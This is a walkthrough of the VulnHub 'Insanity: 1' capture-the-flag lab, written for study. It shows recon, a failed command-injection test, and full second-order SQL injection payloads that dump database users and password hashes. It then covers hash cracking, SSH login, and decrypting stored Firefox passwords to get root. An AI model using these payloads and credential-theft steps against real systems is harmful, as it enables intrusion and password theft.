# Insanity: 1 Vulnhub Walkthrough

Today we are going to solve another boot2root challenge called “**Insanity: 1**“. It’s available at VulnHub for penetration testing and you can download it from **here**.

The merit of making this lab is due to **Thomas Williams**. Let’s start and learn how to break it down successfully.

Level: **Hard**

### Penetration Testing Methodology

**Reconnaissance**

- Netdiscover
- Nmap

**Enumeration**

- Dirsearch
- Wireshark

**Exploiting**

- SQL Injection through e-mails
- Password theft in database
- Weak hash cracking

**Privilege Escalation**

- Cracking to passwords stored in Firefox
- Capture the flag

### Walkthrough

### Reconnaissance

We are looking for the machine with netdiscover

netdiscover -i ethX


Currently scanning: 192.168.24.0/16 | Screen View: Unique Hosts

47 Captured ARP Req/Rep packets, from 9 hosts. Total size: 2824


---------------------------------------------------------------------------------
IP              At MAC Address      Count     Len   MAC Vendor / Hostname
---------------------------------------------------------------------------------
192.168.10.164  --:--:--:--:--:-d       7       420     SAMSUNG ELECTRO MECHANICS
192.168.10.1    --:--:--:--:--:-4      21      1620     Sagemcom Broadband SAS
192.168.10.168  --:--:--:--:--:-b       7        60     VMWare, Inc.
192.168.10.154  --:--:--:--:--:-2       1        60     Sagemcom Broadband SAS
192.168.10.155  --:--:--:--:--:-d       1        60     Intel Corporate
192.168.10.159  --:--:--:--:--:-5       1        64     Sagemcom Broadband SAS
192.168.10.166  --:--:--:--:--:-0       1        60     Amazon Technologies Inc.
192.168.10.156  --:--:--:--:--:-2       1        60     Amazon Technologies Inc.
192.168.10.158  --:--:--:--:--:-8       1        60     Unknown vendor

So, we put the IP address in our “**/etc/hosts**” file and start by running the map of all the ports with operating system detection, software versions, scripts and traceroute.

nmap -A –p- insanity.vh


root@m3n0sd0n4ld:~/Insanity# nmap -p- -A insanity.vh
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 21:50 CEST
Nmap scan report for insanity.vh (192.168.10.168)
Host is up (0.00064s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|    Connected to ::ffff:192.168.10.167
|    Logged in as ftp
|    TYPE: ASCII
|    No session bandwidth limit
|    Session timeout in seconds is 300
|    Control connection is plain text
|    Data connections will be plain text
|    At session startup, client count was 1
|    vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 85:46:41:06:da:83:04:01:bo:e4:1f:9b:7e:8b:31:9f (RSA)
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
|   256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
| http-methods:
|   Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-title: Insanity - UK and European Servers


### Enumeration

The recognition and enumeration of vulnerable services have been the hardest part of this machine. Since it had many services to which they managed to entangle you, turning out to be all of them (except one) rabbit holes.

__Some evidence of these services (rabbit hole):__

__FTP:__


root@m3n0sd0n4ld:~/Insanity# ftp insanity.vh
Connected to insanity.vh.
220 (vsFTPd 3.0.2)
Name (insanity.vh:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0    0     6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -lna
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0    0     6 Apr 02  2020 .
drwxr-xr-x    3 0    0    17 Aug 16 14:48 ..
226 Directory send OK.
ftp> put hello.txt
local: hello.txt remote: hello.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
ftp>


__Bludit (From here we will list the user “Otis”.):__


insanityhosting.vm/news/welcome

# Monitoring Service

Our team have been working hard to create you a free monitoring service for your servers. A special thank you to [Otis](https://www.insanityhosting.vm/news/welcome), who led the team.

We are pleased to announce that from next week, you will be able to register for our monitoring service. This will remain free, whether you are a customer or not.

If you are interested, please e-mail us at hello@insanityhosting.vm, and we can provide you more details.


__phpMyAdmin:__

insanity.vh/phpmyadmin/index.php

Having seen the above, we will go directly to the correct and vulnerable services. We start with the organization’s web service, a hosting service.


insanity.vh

Hami.

Free Server Monitoring  
included with all of our packages.  
Find out about outages before your customers do.  

Get Start Now!


We puzzled with **dirsearch** and found several directories, but we will focus only on two “**/monitoring/**” and “**/webmail/**“.


root@m3n0sd0n4ld:~/Insanity# dirsearch -u http://insanity.vh -e """ -x 403 | tee dirsearch.log
dirsearch v0.3.8
Extensions: | HTTP method: get | Threads: 10 | Wordlist size: 6097

Error Log: /root/Tools/Web/dirsearch/logs/errors-20-10-05_22-02-33.log

Target: http://insanity.vh

[22:02:33] Starting:
[22:02:33] 200 - 22KB - /
[22:02:45] 301 - 231B - /css  →  http://insanity.vh/css/
[22:02:45] 301 - 232B - /data  →  http://insanity.vh/data/
[22:02:47] 301 - 233B - /fonts  →  http://insanity.vh/fonts/
[22:02:47] 200 - 3KB - /gulpfile.js
[22:02:48] 301 - 231B - /img  →  http://insanity.vh/img/
[22:02:48] 200 - 22KB - /index.html
[22:02:48] 200 - 31B - /index.php
[22:02:48] 200 - 31B - /index.php/login/
[22:02:49] 301 - 230B - /js  →  http://insanity.vh/js/
[22:02:51] 302 - 0B - /monitoring/  →  login.php
[22:02:52] 301 - 232B - /news  →  http://insanity.vh/news/
[22:02:52] 200 - 774B - /package.json
[22:02:53] 200 - 85KB - /phpinfo.php
[22:02:53] 301 - 238B - /phpmyadmin  →  http://insanity.vh/phpmyadmin/
[22:02:54] 200 - 15KB - /phpmyadmin/
[22:02:55] 200 - 3KB - /readme.md
[22:03:00] 302 - 0B - /webmail/  →  src/login.php
[22:03:01] 200 - 2KB - /webmail/src/configtest.php

Task Completed


Well, we used the user “**otis**” and the password “**123456**” (I took it out with guessing).


insanity.vh//monitoring/login.php

Sign In

Username

Password

Sign In


We will enter a panel are monitoring the internal server, we see that we can __add new servers__.


insanity.vh/monitoring/index.php

# Your Monitored Servers

## Server Status

Below are the servers you have set to monitor. If a server is down, we will e-mail you a notification along with a report of the downtime.

| Name      | IP Address   | Last Checked        | Status | Modify |
| Localhost | 127.0.0.1    | 2020-10-05 22:13:01 | UP     | Modify |

[Add New]

© 2020, Designed by [Invision](https://www.visionapp.com). Coded by [Creative Tim](https://www.creative-tim.com).


We insert our IP (it can be another one that is operative) and we see that it marks us “**Status: UP**“. What does this tell us? Well, the application below is running a ping to our machine to check if it is on.


# Your Monitored Servers

## Server Status

Below are the servers you have set to monitor. If a server is down, we will e-mail you a notification along with a report of the downtime.

| Name      | IP Address      | Last Checked        | Status | Modify |
| Localhost | 127.0.0.1       | 2020-10-05 22:13:01 | UP     | Modify |
| test2     | 192.168.10.167  | 2020-10-05 22:21:01 | UP     | Modify |

[Add New]


We use **dirsearch** again, this time we will fuze the content of “**/monitoring/**”.

Then, we go through the directories obtained until we reach the directory “**/monitoring/class/**“.


[root@m3n05d0n4ld:~/Insanity# dirsearch -u http://www.insanityhosting.vm/monitoring/ -e "" -x 403 | tee dirsearch-monitoring-dirs.log
dirsearch v0.3.8
Extensions: | HTTP method: get | Threads: 10 | Wordlist size: 6097

Error Log: /root/Tools/Web/dirsearch/logs/errors-20-10-06_07-48-40.log

Target: http://www.insanityhosting.vm/monitoring/

[07:48:40] Starting:
[07:48:40] 302 - OB - /monitoring/ → login.php
[07:48:40] 301 - 256B - /monitoring/assets → http://www.insanityhosting.vm/monitoring/assets/
[07:48:40] 301 - 255B - /monitoring/class → http://www.insanityhosting.vm/monitoring/class/
[07:48:40] 301 - 253B - /monitoring/css → http://www.insanityhosting.vm/monitoring/css/
[07:48:50] 301 - 255B - /monitoring/fonts → http://www.insanityhosting.vm/monitoring/fonts/
[07:48:50] 200 - 861B - /monitoring/plugins.js
[07:48:50] 301 - 256B - /monitoring/images → http://www.insanityhosting.vm/monitoring/images/
[07:48:50] 302 - OB - /monitoring/index.php → login.php
[07:48:50] 302 - OB - /monitoring/index.php/login/ → login.php
[07:48:50] 301 - 252B - /monitoring/js → http://www.insanityhosting.vm/monitoring/js/
[07:48:50] 200 - 5KB - /monitoring/login.php
[07:48:50] 301 - 258B - /monitoring/settings → http://www.insanityhosting.vm/monitoring/settings/
[07:48:50] 200 - 923B - /monitoring/settings/
[07:48:50] 301 - 256B - /monitoring/smartly → http://www.insanityhosting.vm/monitoring/smartly/
[07:48:50] 200 - 2KB - /monitoring/templates/
[07:48:50] 301 - 259B - /monitoring/templates → http://www.insanityhosting.vm/monitoring/templates/
[07:48:50] 200 - 2KB - /monitoring/templates_c/
[07:48:50] 301 - 261B - /monitoring/templates_c → http://www.insanityhosting.vm/monitoring/templates_c/

Task Completed


We access the directory and we find what we already imagined, a “**ping.php**” file.


insanity.vh//monitoring/class

# Index of /monitoring/class

**Name**  
**Last modified**  
**Size Description**  

- **Parent Directory**  
  - database.php    2020-08-16 15:23 1.5K  
  - ping.php        2020-08-16 15:23 9.3K  
  - user.php        2020-08-16 15:23 1.4K  

**URL**  
insanity.vh//monitoring/class/


We open Wireshark and see that the machine does indeed **execute a ping**. Do you think the same as me? Of course, we do! A **command injection**!

##### Let’s do as usual, a **proof of concept**.


# Your Monitored Servers

## Server Status

Below are the servers you have set to monitor. If a server is down, we will e-mail you a notification along with a report of the downtime.

| Name      | IP Address             | Last Checked        | Status | Modify |
| Localhost | 127.0.0.1              | 2020-10-05 22:37:01 | UP     | Modify |
| test2     | 192.168.10.167;whoami  | 2020-10-05 22:37:01 | DOWN   | Modify |


We wait for it to run, but we see that it does not work (**Status: DOWN**). We contrast this information with Wireshark and see that it does not move either, so we are in another “**rabbit hole**“.


ip.addr == 192.168.10.168 && icmp

| No. | Time    | Source    | Destination    | Protocol | Length | Info    |
|---|---|---|---|---|---|---|
| 1945| 292.082267694| 192.168.10.167  | 192.168.10.168    | ICMP    | 98    | Echo (ping) reply    |
| 1944| 292.082125074| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) request    |
| 1685| 236.434186212| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) reply    |
| 1684| 236.434129893| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) request   |
| 1051| 180.903333162| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) reply   |
| 1050| 180.903264277| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) request |
| 571  | 125.390977556| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) reply  |
| 570  | 125.390908696| 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) request|
| 315  | 69.818707719 | 192.168.10.167  | 192.168.10.167    | ICMP    | 98    | Echo (ping) reply  |


Well, nothing, we continue with the other service. Now we have a “**SquirrelMail**” in version **1.4.22**, if you look for exploit you will find that it is vulnerable to remote code execution (RCE), but I already advance you that it will **not work** either xD.


insanity.vh/webmail/src/login.php

SquirrelMail

SquirrelMail version 1.4.22  
By the SquirrelMail Project Team  

SquirrelMail Login  

Name:  
Password:  

Login


We use the same credentials, access the “**Inbox**” and see that emails with errors are arriving. ** Attention! These emails only appear if the server is “DOWN”**.


Folders
Last Refresh: Mon, 10:44 pm (Check mail)

INBOX
INBOX.Drafts
INBOX.Sent
INBOX.Trash

Current Folder
Compose
Search
INBOX

Toggle All

Move Selected To:
INBOX

From                       Daate    Subject
monitor@insanityhosting.vm 10:46 pm WARNING
monitor@insanityhosting.vm 10:45 pm WARNING
monitor@insanityhosting.vm 10:44 pm WARNING
monitor@insanityhosting.vm 10:43 pm WARNING
monitor@insanityhosting.vm 10:42 pm WARNING
monitor@insanityhosting.vm 10:41 pm WARNING
monitor@insanityhosting.vm 10:40 pm WARNING
monitor@insanityhosting.vm 10:39 pm WARNING
monitor@insanityhosting.vm 10:38 pm WARNING
monitor@insanityhosting.vm 10:37 pm WARNING

Toggle All

Sign Out
SquirrelMail


We read one of them, if we look at it, it is structured in 4 columns… This is something that called my attention a lot, since it seems to be loading this information through a database.


Subject: WARNING  
From: monitor@insanityhosting.vm  
Date: Mon, October 5, 2020 10:46 pm  
To: otis@localhost.localdomain  
Priority: Normal  
Options: View Full Header | View Printable Version | Download  
    this as a file  

test2 is down. Please check the report below for more information.

ID,Host,Date Time,Status
166,test2,2020-10-05 22:20:01,1
168,test2,2020-10-05 22:21:01,1
170,test2,2020-10-05 22:22:01,1
172,test2,2020-10-05 22:23:01,1
174,test2,2020-10-05 22:24:01,1
176,test2,2020-10-05 22:25:02,1
178,test2,2020-10-05 22:26:01,1
180,test2,2020-10-05 22:27:01,1
182,test2,2020-10-05 22:28:01,1
184,test2,2020-10-05 22:29:01,1
186,test2,2020-10-05 22:30:02,1
188,test2,2020-10-05 22:31:01,1
190,test2,2020-10-05 22:32:01,1
192,test2,2020-10-05 22:33:01,1
194,test2,2020-10-05 22:34:01,1
196,test2,2020-10-05 22:35:01,1
198,test2,2020-10-05 22:36:02,1
200,test2,2020-10-05 22:37:01,0
202,test2,2020-10-05 22:38:01,0
204,test2,2020-10-05 22:39:02,0
206,test2,2020-10-05 22:40:01,0


Seeing this, I lost my mind and came up with the crazy idea of launching a payload list of **SQL Injection** (/usr/share/wfuzz/wordlist/vulns/sql_inj.txt).

__Configuration Attack:__


# Payload Positions

Configure the positions where payloads will be inserted into the base request. The attack type determines the payload position.

**Attack type:** Sniper

POST /monitoring/index.php HTTP/1.1
Host: insanity.vh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES
Accept-Encoding: gzip, deflate
Referer: http://insanity.vh/monitoring/index.php?page=modify&name=test2
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Connection: close
Cookie: PHPSESSID=ku75levh4fuq7umqma9t6h5ei
Upgrade-Insecure-Requests: 1
DNT: 1

name=§test2§&ipAddress=192.168.10.167;whoami&originalName=


__Executed attack:__


Attack Save Columns

Results  Target  Positions  Payloads  Options

Filter: Showing all items

Request  Payload  Status  Error  Timeout  Length
0    '    302    □    □    □    336
1    --ora_sqls    302    □    □    □    336
2    #mysql    302    □    □    □    336
3    '#'mysql    302    □    □    □    336
4    and 1=1    302    □    □    □    336
5    and USER=USER    302    □    □    □    336
6    and user()=user()    302    □    □    □    336
7    and 2=0    302    □    □    □    336


We are checking all the emails that we receive, we find this one that shows “**Localhost**“, therefore, the site is __vulnerable to SQL Injection__.


Subject: WARNING  
From: monitor@insanityhosting.vm  
Date: Mon, October 5, 2020 11:08 pm  
To: otis@localhost.localdomain  
Priority: Normal  
Options: View Full Header | View Printable Version  

" or 1=1# is down  
Please check the report below for more information.  

| ID   | Host       | Date   Time           |Status|
| 1    | Localhost  | "2020-08-16 18:02:01" | 1    |
| 2    | Localhost  | "2020-08-16 18:02:45" | 1    |
| 3    | Localhost  | "2020-08-16 18:03:01" | 1    |
| 4    | Localhost  | "2020-08-16 18:04:01" | 1    |
| 5    | Localhost  | "2020-08-16 18:05:01" | 1    |
| 6    | Localhost  | "2020-08-16 18:06:01" | 1    |
| 7    | Localhost  | "2020-08-16 18:07:01" | 1    |
| 8    | Localhost  | "2020-08-16 18:08:01" | 1    |
| 9    | Localhost  | "2020-08-16 18:09:01" | 1    |
| 10   | Localhost  | "2020-08-16 18:10:01" | 1    |


We do another test, this time we list the **hostname** and version of **MariaDB**.


Subject:  WARNING  
From:  monitor@insanityhosting.vm  
Date:  Wed, October 7, 2020 5:35 am  
To:  otis@localhost.localdomain  
Priority:  Normal  
Options:  View Full Header  |  View Printable Version  |  Download  

admin" UNION SELECT NULL,NULL,@@hostname,@@version -  - is down. Please check the report below for more information.  

ID, Host, Date Time, Status
,,insanityhosting.vm,5.5.65-MariaDB


### Exploiting

We continue to exploit the vulnerability, although this would be faster by posting only 3 photos, I think it is worth seeing all these images, which will help us learn how to exploit SQL injection without any tools.

**Obtain user and database:**


admin" UNION SELECT NULL,NULL,user(),database() -- - is down. Please check the report below for more information.

ID, Host, Date Time, Status
,,root@localhost,monitoring


**Obtain all databases:**


admin" UNION SELECT NULL,NULL,NULL,SCHEMA_NAME FROM information_schema.SCHEMATA -- - is down. Please check the report below for more information.

ID, Host, Date Time, Status
,,,information_schema
,,,monitoring
,,,mysql
,,,performance_schema


**Obtain all tables:**


admin" UNION SELECT 1, concat(table_schema,".",table_name),null,null from information_schema.tables -- - is down. Please check the report below for more information.

ID, Host, Date Time, Status
1,information_schema.CHARACTER_SETS,,
1,information_schema.CLIENT_STATISTICS,,
1,information_schema.COLLATIONS,,
1,information_schema.COLLATION_CHARACTER_SET_APPLICABILITY,,
1,information_schema.COLLUMNS,,
1,information_schema.COLLUMN_PRIVILEGES,,
1,information_schema.ENGINES,,
1,information_schema.EVENTS,,
1,information_schema.FILES,,
1,information_schema.GLOBAL_STATUS,,
1,information_schema.GLOBAL_VARIABLES,,
1,information_schema.INDEX_STATISTICS,,
1,information_schema.KEY_CACHES,,
1,information_schema.KEY_COLUMN_USAGE,,
1,information_schema.PARAMETERS,,
1,information_schema.PARTITIONS,,
1,information_schema.PLUGINS,,
1,information_schema.PROCESSLIST,,
1,information_schema.PROFILING,,
1,information_schema.REFERENTIAL_CONSTRAINTS,,
1,information_schema.ROUTINES,,
1,information_schema.SCHEMATA,,
1,information_schema.SCHEMA_PRIVILEGES,,
1,information_schema.SESSION_STATUS,,
1,information_schema.SESSION_VARIABLES,,
1,information_schema.STATISTICS,,
1,information_schema.TABLES,,
1,information_schema.TABLESPACES,,
1,information_schema.TABLE_CONSTRAINTS,,
1,information_schema.TABLE_PRIVILEGES,,
1,information_schema.TABLE_STATISTICS,,
1,information_schema.TRIGGERS,,
1,information_schema.USER_PRIVILEGES,,
1,information_schema.USER_STATISTICS,,
1,information_schema.VIEWS,,
1,information_schema.INNODB_CMPMEM_RESET,,
1,information_schema.INNODB_RSEG,,
1,information_schema.INNODB_UNDO_LOGS,,


**Obtain all the columns in a table:**


admin" union select 1, column_name,null,null from information_schema.columns where table_name = 'users'-- - is down. Please check the report below for more information.

ID, Host, Date Time, Status
1,id,,
1,username,,
1,password,,
1,email,,


**Dump users, passwords and emails:**


admin" UNION SELECT 1, username, password, email FROM monitoring.users -- - is down. Please check the report below for more information.

ID, Host, Date, Time, Status

1, @insanityhosting.vm
1, @insanityhosting.vm
1, otis,$2y$12$,/XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW,otis@insanityhosting.vm


After trying to crack the hashes of the **two** (hidden) **users**, it is not possible to obtain it even with JTR, Hascat or other online tools. Everything looks like another “**rabbit hole**“.

We continue to list and find these two hashes in the “**mysql**” database.


admin" UNION SELECT 1, user, password, authentication_string FROM mysql.user -- is down. Please check the report below for more information.

ID, Host, Date Time, Status
1,root,*CDA244
1,,,
1,elliot,*5A5749


The **2nd hash** does not correspond to that of a **MySQL**, we use the online tool “**hashes.com**” and obtain the password in plain text.


We logged in through **SSH** and great! We are in!


root@m3n0sd0n4ld:~/Insanity# ssh -----@insanity.vh
The authenticity of host 'insanity.vh (192.168.10.168)' cannot be established.
ECDSA key fingerprint is SHA256:vGWrdjBS8NkKS9/tOkTz2Edsk
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'insanity.vh,192.168.10.168' (ECDSA)
hosts.
elliot@insanity.vh's password:
Last login: Wed Aug 31 10:00:29 1994 from @Y@IWf@3@
[-----@insanityhosting ~]$ id
uid=1003(-----) gid=1003(-----) grupos=1003(-----)
[-----@insanityhosting ~]$


### Privilege Escalation (root)

We do an “**ls -lna**” and see that we have a “**Mozilla Firefox**” folder, very very rare.

Whenever you see software folders, check it out, because it’s not normal.


drwxr-xr-x.  5 1003 1003 144  ago 16 17:38 .
drwxr-xr-x.  7    0    0  76  ago 16 19:02 .
lrwxrwxrwx.  1    0    0   9  ago 16 17:38 .bash_history -> /dev/null
-rw-r--r--.  1 1003 1003  18  abr  1  2020 .bash_logout
-rw-r--r--.  1 1003 1003 193  abr  1  2020 .bash_profile
-rw-r--r--.  1 1003 1003 231  abr  1  2020 .bashrc
drwx------.  3 1003 1003  21  ago 16 16:23 .cache
drwx------.  5 1003 1003  66  ago 16 16:23 .mozilla
drwx------.  2 1003 1003  25  ago 16 17:28 .ssh
-rw-r--r--.  1 1003 1003 100  ago 16 17:26 .xauthority


We check if the browser has been storing user passwords. How to check this? As simple as listing these **4 files**.


[-----@insanityhosting esmhp32w.default-default]$ ls | grep -E "logins.json|cert9.db
cookies.sqlite|key4.db"
cert9.db
cookies.sqlite
key4.db
logins.json


If these files exist, it means that they contain passwords and we can use a tool “**Firefox_Decrypt**” to obtain the passwords in plain.

We download the tool, choose the **2nd option** and we will NOT give you a password when you ask for the “Master Password”.

We will get some __credentials__ in the “**root**” user plane.


-----@insanityhosting esmhp32w.default-default]$ python firefox_decrypt.py
Select the Firefox profile you wish to decrypt
1 → wqge31s0.default
2 → esmhp32w.default-default
2

Master Password for profile /home/.mozilla/firefox/esmhp32w.default-default:
2020-10-07 08:31:59,361 - WARNING - Attempting decryption with no Master Password

Website: https://localhost:10000
Username: 'root'
Password: 'S8Y389--------------------'
[-----@insanityhosting esmhp32w.default-default]$


Then we try to authenticate with the user “**root**” and the password obtained and…. Yes! we are root!

We read the flag and have a good coffee.


[-----@insanityhosting esmhp32w.default-default]$ su root
Contraseña:
[root@insanityhosting esmhp32w.default-default]# cd /root
[root@insanityhosting ~]# ls
anaconda-ks.cfg   flag.txt
[root@insanityhosting ~]# cat flag.txt
Insanity

Well done for completing Insanity. I want to know how difficult you found this - let me know on my blog here: https://security.caerdydd.wales/insanity-ctf/

Follow me on twitter @bootlesshacker

https://security.caerdydd.wales

Please let me know if you have any feedback about my CTF - getting feedback for my CTF keeps me interested in making them.

Thanks!
Bootlesshacker
